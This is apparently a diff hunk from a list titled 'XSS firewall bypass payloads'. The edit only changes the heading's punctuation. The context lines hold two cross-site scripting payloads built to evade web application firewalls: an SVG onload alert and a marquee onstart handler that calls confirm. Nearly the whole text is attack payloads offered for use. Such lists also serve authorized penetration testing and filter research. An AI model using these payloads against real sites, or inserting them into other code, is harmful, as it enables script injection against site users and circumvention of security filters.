@@ -1,4 +1,4 @@
-XSS FIREWALL BYPASS PAYLOADS :
+XSS FIREWALL BYPASS PAYLOADS :-
 
 "/><svg/onload=alert(/XSS/)>
 '><marquee onstart="[117].find(confirm)">
